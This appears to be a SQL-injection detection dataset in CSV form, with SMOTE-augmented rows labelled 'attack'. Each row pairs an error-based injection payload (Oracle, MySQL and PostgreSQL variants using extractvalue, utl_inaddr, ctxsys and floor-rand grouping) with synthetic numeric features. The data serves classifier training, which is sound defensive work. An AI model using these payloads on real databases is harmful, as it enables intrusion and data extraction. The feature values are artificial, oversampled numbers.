id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000375,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.0,221.0,42.0,4.3919306235717706,123.0,2.0,71.0,25.0,0.5565610859728507,0.009049773755656104,0.3212669683257919,0.11312217194570136,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,7.0,1.0,3.000000000000001,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000376,attack,error,-1796'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'lpuw' like 'lpuw,nearest_attack_euclidean,R000904,0.26914754434444177,363.352581927449,36.64536041816626,3.682914925849444,103.0,48.0,150.64330276378158,61.709279163667475,0.2840816939088941,0.13238758551094093,0.41371195955804313,0.16981876102212184,4.0,0.0,1.0,0.0,0.0,2.0,0.0,30.709279163667482,0.0,3.0,0.0,23.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000377,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000013,0.7393269083034347,128.0266574038564,36.29945870842079,4.193046147811801,67.06414063929701,1.0,42.79675225052473,17.16576451403465,0.5267592072127293,0.00796820125815817,0.3312142403477826,0.13405835118132997,3.0,0.0,0.0,0.0,0.0,2.0,0.0,5.732611611227716,0.0,5.0,0.0,2.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000378,attack,error,select   (  case when   (  1272  =  5883  )   then 1272 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000311,1.6858739404357614e-07,133.0,29.0,3.7442941285734888,56.0,14.0,51.0,11.999999999999996,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000379,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   # fmxq",nearest_attack_euclidean,R000287,0.9582285001598004,153.97696786775202,30.0,3.729637000465228,43.02705726046013,34.131261174088515,58.37075139001756,18.447898043185813,0.2798537468726053,0.22413162205609383,0.3765265134180816,0.11948811765321936,0.0,0.0,0.0,0.0,0.28957960863716203,1.0,0.0,11.158318434548649,0.0,0.0,4.710420391362838,1.2895796086371618,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.5791592172743238,0.0,0.0,0.28957960863716214,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8687388259114863
SMOTE_000380,attack,error,"1'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'rggg'  =  'rggg",nearest_attack_euclidean,R000130,0.11951042157244579,374.74609547693547,34.343912688461025,3.462458141188476,92.0,49.0,169.12174623077954,64.6243492461559,0.24573161026147436,0.13087879242187223,0.45093577316194483,0.17245382415470864,4.0,0.0,0.0,0.0,0.0,3.0,0.0,34.62434924615591,0.0,0.0,1.0,23.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000381,attack,error,"1 where 2278  =  2278 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000903,0.20532634567978217,274.09778063132995,37.09778063132997,4.041619211350605,102.0,43.0,97.0,32.09778063132997,0.37213040976249956,0.15687850607634787,0.35388872300943586,0.11710236115171668,0.09778063132996984,0.0,2.0,0.0,2.0,2.0,0.0,18.0,0.0,2.0,5.0,6.0,0.09778063132996984,0.0,1.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000382,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'lvck'  =  'lvck",nearest_attack_euclidean,R000272,0.32211937166816584,365.49343825151686,34.53618298203451,3.5053523573538135,92.0,49.0,161.5658042155859,62.92763403593098,0.2518061317247078,0.1341141353751161,0.4418973417831682,0.1721823911170079,4.0,0.0,0.0,0.0,0.0,3.0,0.0,32.92763403593098,0.0,0.0,1.0,23.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000383,attack,error,"1""  )   as gffq where 4387  =  4387 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000701,0.4918706507689052,177.1243337659707,32.66099981458398,3.8238141385112447,47.0,43.0,65.67800037083204,21.446333395138673,0.26545235006665957,0.2428606606992843,0.37061468969545375,0.12107229953860241,0.0,1.0,2.0,0.0,0.0,2.0,0.0,11.446333395138673,0.0,0.0,5.0,4.0,0.0,1.0,1.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,1.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000384,attack,error,"1' in boolean mode  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  #",nearest_attack_euclidean,R000553,1.336983030035195,201.7862641977365,32.50659349049754,3.9189100091798514,74.14642884411703,37.0,70.3865386083707,20.25329674524877,0.3668094018653341,0.18388825290485689,0.3489051626474945,0.10039718258231448,1.0,0.0,0.0,0.0,0.0,1.0,0.0,12.626648372624386,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.6266483726243862,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000385,attack,error,"-3492"" where 4094  =  4094 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",nearest_attack_euclidean,R000252,0.1018615133788235,357.8860706871723,31.962023562390776,3.3741549626036145,79.03797643760923,55.88607068717232,162.0,60.96202356239078,0.22084818617025326,0.1561538543357152,0.45265919072057664,0.1703387687734549,0.0,1.0,2.9620235623907747,0.0,0.0,3.0,0.0,32.0,0.0,0.0,0.0,25.962023562390776,0.0,1.0,1.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,1.0,1.1102230246251565e-16,0.037976437609224756,0.9620235623907752,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000386,attack,error,"1""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""imlx""  =  ""imlx",nearest_attack_euclidean,R000180,0.26190952509489956,281.4634777578936,35.68902176008777,3.9845861485081535,108.0,35.0,103.21956479824465,35.24391295964893,0.38428874249433564,0.12453801840094211,0.36601924523836965,0.12515399386635265,0.0,4.0,0.0,0.0,2.0,2.0,0.0,19.24391295964893,0.0,2.0,5.0,4.0,0.0,1.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000387,attack,error,"1'  )   as gxpb where 7107  =  7107 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000947,0.6532880827481649,202.31133426102642,31.40251872467254,3.5794500050161324,52.20755617401761,40.0,84.40251872467253,25.70125936233627,0.257882950860582,0.19779857216423452,0.4172735919952868,0.12704488497989666,0.701259362336269,0.0,2.0,0.0,1.0,2.0,0.0,15.0,0.0,0.0,4.0,5.0,0.701259362336269,0.0,1.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000388,attack,error,-8860  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,nearest_attack_euclidean,R001008,0.6234834535746328,409.457991262001,32.31074963591671,3.404884890382115,100.93224890775012,56.485997087333644,183.41824599508377,68.62149927183341,0.24658961609041327,0.13781234263518133,0.44794628070249404,0.1676517605719114,0.0,0.0,1.0,0.0,0.0,2.3107496359167055,0.0,39.31074963591671,0.0,0.0,0.0,29.310749635916707,0.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,2.0,0.3107496359167057,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.3107496359167055
SMOTE_000389,attack,error,select   (  case when   (  8375  =  8318  )   then 8375 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000517,0.0009567501341224838,133.0,28.0,3.7294981743821944,56.0,14.0,51.0,11.999999999999996,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000390,attack,error,"-9176'   )    )    as eunw where 5978  =  5978 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000859,1.0058378286881864,233.65196154534527,40.08149519316816,3.9000964220333536,71.24448557950447,45.0,93.32598077267264,24.081495193168156,0.30483496303006047,0.1928199489250247,0.3993051377835982,0.10303995026131663,0.5407475965840783,0.0,1.0,0.0,1.0,2.0,0.0,15.540747596584078,0.0,0.0,3.0,4.0,0.5407475965840783,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,1.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,7.0
SMOTE_000391,attack,error,"1%'   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000276,0.6906523061086264,160.45308007785246,33.08009497080532,3.77401772512858,53.67962011677873,23.30663500973156,63.08009497080532,20.386729980536877,0.33394562965374464,0.14526565082152582,0.393535835000941,0.1272528845237885,1.0,0.0,0.0,0.0,0.0,0.0,0.0,13.693364990268439,0.6933649902684393,0.0,4.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,2.220446049250313e-16,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000392,attack,error,"1'  )   where 1323  =  1323 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000181,0.2987829252804902,165.85721790461827,29.0,3.7460892441521394,41.0,43.0,61.0,20.85721790461828,0.24720168185142938,0.2592603004783284,0.3677878681204193,0.12575014954982294,0.8572179046182793,0.0,2.0,0.0,0.0,2.0,0.0,11.0,0.0,0.0,5.0,4.0,0.8572179046182793,0.0,1.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,1.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000393,attack,error,"1'   )    )    as fwxq where 9935  =  9935 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000797,0.4517074043680174,207.914813409136,33.41640191559086,3.639696724346701,52.83280383118172,40.0,88.66560766236344,26.41640191559086,0.25405399802719497,0.19271479461707397,0.4262042083421336,0.12702699901359749,0.8054673051969531,0.0,2.0,0.0,1.0,2.0,0.0,15.610934610393906,0.0,0.0,4.0,5.0,0.8054673051969531,0.0,1.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000394,attack,error,-9501'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'mndw'  =  'mndw,nearest_attack_euclidean,R000690,0.008564677889866673,430.0,34.0,3.4854448865273264,111.0,54.0,191.0,74.0,0.25813953488372093,0.12558139534883722,0.4441860465116279,0.17209302325581396,4.0,0.0,1.0,0.0,0.0,3.0,0.0,40.0,0.0,0.0,0.0,30.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,8.0
SMOTE_000395,attack,error,"1%'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  '%'  =  '",nearest_attack_euclidean,R000515,0.3737599428672093,279.88477687344187,36.144982836418606,3.913417250332133,99.8550171635814,35.0,106.73979403702324,38.289965672837205,0.35688418853533393,0.12508384396931366,0.38123020557468745,0.13680176192066495,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.289965672837205,2.0,2.0,5.0,4.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.8550171635813966,0.14498283641860327,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000396,attack,error,"1'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'fgox' like 'fgox",nearest_attack_euclidean,R000557,0.5546981741170078,298.5775174811539,35.577517481153926,3.8841028483281614,110.3100699246157,35.0,115.84496503769215,37.422482518846074,0.3694420882760303,0.1172228108028957,0.38799611721327526,0.12533898370779872,4.0,0.0,0.0,0.0,2.0,1.4224825188460746,0.0,22.0,0.0,2.0,5.0,3.422482518846075,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000397,attack,error,"1'  )   as najc where 5213  =  5213 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000126,0.16063346091136935,180.90259629498115,34.0,3.8476717257339743,60.0,32.0,67.63079682426957,21.271799470711596,0.3317668115066117,0.1769422994701929,0.3737112175189372,0.11757967150425816,1.0,0.0,2.0,0.0,0.0,1.0,0.0,13.271799470711596,0.0,0.0,4.0,3.000000000000001,1.0,0.0,1.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.220446049250313e-16,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000398,attack,error,"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000462,0.4304134766319855,250.83737521664526,34.290656195838686,3.950042322300704,96.12803141248395,35.0,90.41868760832263,29.290656195838686,0.3832091417039709,0.13954000043870673,0.36045999956129327,0.11679085829602912,0.0,0.0,0.0,0.0,2.0,1.0,0.0,18.0,0.0,2.0,5.290656195838685,3.000000000000001,0.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,0.709343804161315,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.709343804161314
SMOTE_000399,attack,error,"1%""   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000527,0.8649480517844924,392.6280368589519,34.0,3.3952481425703747,90.57129150229534,49.65712915022954,182.12827672993498,70.27133947649197,0.23046816817310373,0.12730240695616202,0.46315137842563286,0.1790780464451014,0.0,4.0,0.0,0.0,0.0,3.0,0.0,37.28564575114767,2.0,0.0,0.6714354248852326,24.971387450688603,0.0,1.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.328564575114767,0.0,0.0,1.3285645751147672,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.657129150229534
SMOTE_000400,attack,error,"-7258 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000783,0.021324046204751274,200.2899103999418,39.0,3.8919495281283023,63.0,37.0,79.23192831995343,21.057982079988353,0.3145545279220407,0.18473837354151595,0.3955727498145191,0.10513434872192423,0.0,0.0,1.0,0.0,1.0,1.0,0.0,14.057982079988355,0.0,0.0,3.0,3.000000000000001,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
